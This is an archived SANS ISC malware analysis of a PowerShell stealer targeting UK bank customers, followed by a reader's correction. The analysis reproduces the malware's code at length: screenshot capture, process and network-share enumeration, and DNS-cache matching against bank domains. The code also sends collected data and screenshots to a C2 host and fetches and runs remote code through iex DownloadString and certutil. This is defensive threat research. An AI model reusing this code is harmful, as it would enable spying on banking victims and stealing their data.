{
    "id": "a9d93578-b744-4fa1-8a8f-608ce350c313",
    "created_at": "2023-01-12T15:09:28.963941Z",
    "updated_at": "2025-03-27T02:05:42.500631Z",
    "deleted_at": null,
    "sha1_hash": "e86644c8761b3b4cd37a311f720a220f861b5315",
    "title": "2018-05-19 - Malicious Powershell Targeting UK Bank Customers",
    "authors": "",
    "file_creation_date": "2022-05-28T15:57:28Z",
    "file_modification_date": "2022-05-28T15:57:28Z",
    "file_size": 4515626,
    "plain_text": "# SANS ISC: Malicious Powershell Targeting UK Bank Customers - SANS Internet Storm Center SANS Site Network Current Site SANS Internet Storm Center Other SANS Sites Help Graduate Degree Programs Security Training Security Certification Security Awareness Training Penetration Testing Industrial Control Systems Cyber Defense Foundations DFIR Software Security Government OnSite Training SANS ISC InfoSec Forums\n\n**[isc.sans.edu/forums/diary/Malicious+Powershell+Targeting+UK+Bank+Customers/23675/](https://isc.sans.edu/forums/diary/Malicious+Powershell+Targeting+UK+Bank+Customers/23675/)**\n\n\n-----\n\n## I found a very interesting sample thanks to my hunting rules… It is a PowerShell script that was uploaded on VT for the first time on the 16th of May from UK. The current VT score is still 0/59[1]. The upload location is interesting because the script targets major UK bank customers as we will see below. Some pieces of the puzzle are missing. I don’t know how the script was dropped on the target. A retro-hunt search reported a malicious PE file (SHA256:3e00ef97f017765563d61f31189a5b86e5f611031330611b834dc65623000c9e[2]) that downloads another PowerShell script from a site located on a similar URL as found in the first file (hxxps://cflfuppn[.]eu/sload/run-first.ps1). Let’s check deeper the initial script. The first comment: it is not obfuscated and very easy to read and understand. Here is a review of the actions performed.\n\n\n-----\n\n## A specific directory is created to store all the files downloaded and created. The directory name is based on the system UUID and contains other sub-directories:\n\n (Note: the code has been beautified for easier reading)\n```\n$uuid = (Get-WmiObject Win32_ComputerSystemProduct).UUID ;\n$path = $env:APPDATA+\"\\\"+$uuid;\n$pp=$path+'\\'+$uuid;\ntry{ if([System.IO.File]::Exists($pp+\"_0\")){ Remove-Item $pp\"_0\";} }catch{}\ntry{ if([System.IO.File]::Exists($pp+\"_1\")){ Remove-Item $pp\"_1\";} }catch{}\ntry{ if([System.IO.File]::Exists($pp+\"_2\")){ Remove-Item $pp\"_2\";} }catch{}\ntry{ if([System.IO.File]::Exists($pp)){ Remove-Item $pp; } }catch{}\n\n The most interesting function of the script: It has the capability to take screenshots:\n\n```\n\n-----\n\n```\n[void] [System.Reflection.Assembly]::LoadWithPartialName( System.Drawing )\n[void] [System.Reflection.Assembly]::LoadWithPartialName(\"System.Windows.Forms\")\nfunction Get-ScreenCapture{\n Param(\n  [Parameter()]\n  [Alias(\"Path\")]\n  [string]$Directory = \".\",\n  [Parameter()]\n  [ValidateRange(70,100)]\n  [int]$Quality,\n  [Parameter()]\n  [Switch]$AllScreens)\n Set-StrictMode -Version 2\n Add-Type -AssemblyName System.Windows.Forms\n if ($AllScreens) {\n  $Capture = [System.Windows.Forms.Screen]::AllScreens\n } else {\n  $Capture = [System.Windows.Forms.Screen]::PrimaryScreen\n }\n foreach ($C in $Capture) {\n  $screenCapturePathBase = $path+\"\\ScreenCapture\"\n  $cc = 0\n  while (Test-Path \"${screenCapturePathBase}${cc}.jpg\") {\n   $cc++\n  }\n  $FileName=\"${screenCapturePathBase}${cc}.jpg\"  \n  $Bitmap = New-Object System.Drawing.Bitmap($C.Bounds.Width, $C.Bounds.Height)\n  $G = [System.Drawing.Graphics]::FromImage($Bitmap)\n  $G.CopyFromScreen($C.Bounds.Location, (New-Object System.Drawing.Point(0,0)),\n$C.Bounds.Size)\n  $g.Dispose()\n  $Quality=70;\n  $EncoderParam = [System.Drawing.Imaging.Encoder]::Quality\n  $EncoderParamSet = New-Object System.Drawing.Imaging.EncoderParameters(1)\n  $EncoderParamSet.Param[0] = New-Object\nSystem.Drawing.Imaging.EncoderParameter($EncoderParam, $Quality)\n  $JPGCodec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |\nWhere{$_.MimeType -eq 'image/jpeg'}\n  $Bitmap.Save($FileName,$JPGCodec, $EncoderParamSet)\n  $FileSize = [INT]((Get-Childitem $FileName).Length / 1KB)\n }\n}\n\n## Then, a list of URLs is probed to download the next payload. They use BitsAdmin to do the job in the background and wait for the completion of at least one download.\n\n```\n\n-----\n\n```\n$d \n@(\"hxxps://cflfuppn[.]eu/sload/gate.php\",\"hxxps://sbnlnepttqvbltm[.]eu/sload/gate.php”\nFor ($i=0; $i -le $d.Length-1; $i++){\n $rp= -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})\n $dm0 = \"cmd.exe\";\n $ldf='/C bitsadmin /transfer '+$rp+' /download /priority normal \"'+$d[$i]+'?ch=1\"\n'+$path+'\\'+$uuid+'_'+$i;\n $ldg='/C bitsadmin /SetMaxDownloadTime '+$rp+' 60'\n start-process -wiNdowStylE HiDden $dm0 $ldf;\n start-process -wiNdowStylE HiDden $dm0 $ldg;\n}\n$e=1\nwhile($e -eq 1) {\n $ad=2;\n For ($i=0; $i -le $d.Length-1; $i++) {    \n  $pp=$path+'\\'+$uuid+'_'+$i;\n  if([System.IO.File]::Exists($pp)) {\n   $line=Get-Content $pp\n   if ($line -eq \"sok\"){ $did=$i; }\n   $ad=1;\n  }      \n }\n if ($ad -eq 1){ $e=2; }\n Start-Sleep -m 30000\n}\n\n## Note the very long waiting time in the loop (30K minutes). Unfortunately, both URLs were not working during my analysis. At the end of the while() loop, $did contains the index of the URL which worked. It will be re-used later.\n\n The next step is to generate a list of processes running on the target system (without the classic Windows system processes)\n$out=\"\";\n$tt=Get-Process | Select-Object name\nfor ($i=0; $i -le $tt.length-1; $i++) {\n if ($tt[$i].Name -notmatch \"svchost\" -and $tt[$i].Name -notmatch \"wininit\" -and\n$tt[$i].Name -notmatch \"winlogon\" -and \\\n   $tt[$i].Name -notmatch \"System\" -and $tt[$i].Name -notmatch \"dllhost\" -and\n$tt[$i].Name -notmatch \"conhost\" -and \\\n   $tt[$i].Name -notmatch \"ApplicationFrameHost\" -and $tt[$i].Name -notmatch\n\"csrss\" -and \\\n   $tt[$i].Name -notmatch \"bitsadmin\" -and $tt[$i].Name -notmatch \"cmd\" -and\n$tt[$i].Name -notmatch \"RuntimeBroker\") {\n  $out=$out+\"*\"+$tt[$i].Name;\n }  \n}\n\n The list of network shares is generated:\n\n```\n\n-----\n\n```\n$outD ;\n$dd=Get-WmiObject -Class Win32_LogicalDisk | Where-Object {$_.Description -match\n'Network'} | Select-Object ProviderName,DeviceID;\ntry{ if ($dd ){for ($i=0; $i -le $dd.length; $i++)\n{$outD=$outD+'{'+$dd[$i].DeviceID+''+$dd[$i].ProviderName+'}';}} }catch {}\ntry{ if ($dd -and $outD -eq \"\" )\n{$outD='{'+$dd[$i].DeviceID+''+$dd.ProviderName+'}';}}catch {}\n\n## Basic information about the target system:\n$v1=[System.Environment]::OSVersion.Version.Major;\n$v2=[System.Environment]::OSVersion.Version.Minor;\n$cp=Get-WmiObject win32_processor | select Name;\ntry{ if ($cp.length -gt 0){ $cpu=$cp[0].Name }else{$cpu=$cp.Name} }catch {}\n\n The most interesting part is the following. The script gets a list of DNS resolver cache via the ‘ipconfig /displaydns’ command and searches for interesting domains. The script contains a nice list of UK banks domains:\n$oB=\"\";\n$b =\n@(\"nwolb.com\",\"bankline\",\"bankofscotland.co.uk\",\"bankofscotland.co.uk\",\"secure.lloydsb\n \\\n\"secure.halifaxonline.co.uk\",\"hsbc.co.uk\",\"rbsdigital.com\",\"barclays.co.uk\",\"onlinebus\n \\\n\"tsb.co.uk\",\"retail.santander.co.uk\",\"business.santander.co.uk\",\"onlinebanking.nationw\n$dn=ipconfig /displaydns | select-string \"Record Name\"\nforEach ($z in $dn) {\n for ($i=0; $i -le $b.length-1; $i++){\n  if ($z -match $b[$i] -and $oB -notmatch $b[$i] ){ $oB+=\"*\"+$b[$i];}\n }\n}\n\n If you are a UK bank customer and if you are performing online banking operations, there are chances that one of the domains above will be in your cache.\n\n All the captured data are exfiltrated via an HTTP request:\n$rp= -join ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})\n$dm0 = \"cmd.exe\";\n$ldf='/C bitsadmin /transfer '+$rp+' /download /priority FOREGROUND \"'+$d[$did]+ \\\n  '?g=top.14.05&id='+$uuid+'&v='+$v1+'.'+$v2+'&c='+$rp+'&a='+$out+'&d='+$outD+ \\\n  '&n='+$env:ComputerName+'&bu='+$oB+'&cpu='+$cpu+'\" '+$path+'\\'+$uuid;\nstart-process -wiNdowStylE HiDden $dm0 $ldf;  \n\n Here is an example of HTTP request:\n\n```\n\n-----\n\n```\n hxxps://cflfuppn[.]eu/sload/gate.php?g top.14.05&id C3FB4D56 AA47 B150 E48F\n6ECA7E0F9A1F&v=10.0&c=DFnvTdwyapGVXEMZ&a=*armsvc*audiodg*browser_broker*chrome*chrome*\n{H:\\\\nas\\test}{Z:}{}&n=WIN10VM&bu=*rootshell&cpu=Intel(R) Core(TM) i7-6920HQ CPU @\n2.90GHz” path=C:\\Users\\xavier\\AppData\\Roaming\\C3FB4D56-AA47-B150-E48F6ECA7E0F9A1F\\C3FB4D56-AA47-B150-E48F-6ECA7E0F9A1F\n\n## The result of this request is stored in %APPDATA%\\C3FB4D56-AA47-B150-E48F- 6ECA7E0F9A1F\\C3FB4D56-AA47-B150-E48F-6ECA7E0F9A1F and is parsed to take further actions. I presume that the returned content depends on the collection victim details. Based on the code below, we can deduce the behaviour:\n$line=Get-Content $pp\nif ($line -match \"run=\"){\n $u=$line -replace 'run=','';\n $ldf=\"/C powershell.exe -command iex ((nEw-ObJect ('NEt.WeBclient')).\n('DowNLoAdStrInG').invoKe(('\"+$u+\"')))\";\n start-process -wiNdowStylE HiDden $dm0 $ldf;\n} elseif ($line -match \"updateps=\") {\n $u=$line -replace 'updateps=','';\n $ldf=\"/C powershell.exe -command iex ((nEw-ObJect ('NEt.WeBclient')).\n('DowNLoAdStrInG').invoKe(('\"+$u+\"')))\";\n start-process -wiNdowStylE HiDden $dm0 $ldf;\n try{ if([System.IO.File]::Exists($pp+\"_0\")){ Remove-Item $pp\"_0\";} }catch{}\n try{ if([System.IO.File]::Exists($pp+\"_1\")){ Remove-Item $pp\"_1\";} }catch{}\n try{ if([System.IO.File]::Exists($pp+\"_2\")){ Remove-Item $pp\"_2\";} }catch{}\n try{ Remove-Item $pp; }catch{}\n break;break;break;break;\n}elseif ($line.length -gt 3) {\n $rp= -join ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})\n $ldf='/C bitsadmin /transfer '+$rp+' /download /priority FOREGROUND '+$line+'\n'+$path+'\\'+$uuid+'_'+$rp+'.txt & Copy /Z '+$path+'\\'+$uuid+'_'+$rp+'.txt\n'+$path+'\\'+$uuid+'_'+$rp+'_1.txt & certutil -decode\n'+$path+'\\'+$uuid+'_'+$rp+'_1.txt '+$path+'\\'+$uuid+'_'+$rp+'.exe & powershell command \"start-process '+$path+'\\'+$uuid+'_'+$rp+'.exe\" >>\n'+$path+'\\'+$uuid+''+$rp+'.log & bitsadmin /transfer '+$rp+'s /download /priority\nnormal \"'+$d[$did]+'?ts=1&id='+$uuid+'&c='+$rp+'\" '+$path+'\\'+$uuid+'_'+$rp+'.txt';\n start-process -wiNdowStylE HiDden $dm0 $ldf;\n}\n\n If the line starts with ‘run=‘, a new PowerShell script is downloaded and executed. If the line starts with ‘updateps=‘, another script is downloaded and previous files are removed if existing. Otherwise, the line contains an URL which is downloaded. The data is Base64 encoded, is decoded with certutil.exe and executed. Another HTTP request is performed:\n\"hxxps://cflfuppn[.]eu/sload/gate.php?ts=1&id=C3FB4D56-AA47-B150-E48F6ECA7E0F9A1F&c=PFexTUwEzpGXXgwl”\n\n This looks like clearly a communication channel with the C2.\n\n Then, five screenshots are performed:\n\n```\n\n-----\n\n```\nfor ($i 0;$i le 5;$i++){\n Get-ScreenCapture;\n Start-Sleep -s 40\n}\n\n## And uploaded to the C2:\n$c=0;\n$screenCapturePathBase = $path+\"\\ScreenCapture\";\nwhile (Test-Path \"${screenCapturePathBase}${c}.jpg\") {\n try{ Invoke-RestMethod -Uri \"https://cflfuppn.eu/sload/u.php?id=$uuid&i=$c\" -Method\nPost -InFile \"${screenCapturePathBase}${c}.jpg\" -UseDefaultCredentials }catch{}\n Remove-Item \"${screenCapturePathBase}${c}.jpg\";\n $c++;\n}\n\n All this code is placed in the script main loop with a sleep time of 600 seconds.\n\n Do you have more information about the missing payloads? Please share.\n\n [1] https://www.virustotal.com/#/file/89c97d1b29ea78baf061e31e8d5258abcdd2cd3830ab9f9 e9b6a47bb64d05ccb/community\n [2] https://www.virustotal.com/#/file/3e00ef97f017765563d61f31189a5b86e5f611031330611b 834dc65623000c9e/detection\n\n Xavier Mertens (@xme) ISC Handler - Freelance Security Consultant PGP Key\n\n I will be teaching next: Reverse-Engineering Malware: Malware Analysis Tools and Techniques - SANS London June 2022 Xme\n\n 687 Posts ISC Handler May 19th 2018\n\n \"Note the very long waiting time in the loop (30K minutes).\"\n\n Actually, the -m parameter to start-sleep is sleep time in milliseconds. So the true wait time is 30 seconds. Why they went that way instead of using the -s parameter...*shrug* Snuffy\n\n 4 Posts\n\n```\n\n-----\n\n## Oh my bad! I don t understand how I made this stupid mistake. I probably read -s for seconds and deducted \"-m\" for minutes... was too tired!? Thank you for the feedback!\n\n Xme\n\n 687 Posts ISC Handler\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-05-19 - Malicious Powershell Targeting UK Bank Customers.pdf"
    ],
    "report_names": [
        "2018-05-19 - Malicious Powershell Targeting UK Bank Customers.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536168,
    "ts_updated_at": 1743041142,
    "ts_creation_date": 1653753448,
    "ts_modification_date": 1653753448,
    "files": {
        "pdf": "https://archive.orkl.eu/e86644c8761b3b4cd37a311f720a220f861b5315.pdf",
        "text": "https://archive.orkl.eu/e86644c8761b3b4cd37a311f720a220f861b5315.txt",
        "img": "https://archive.orkl.eu/e86644c8761b3b4cd37a311f720a220f861b5315.jpg"
    }
}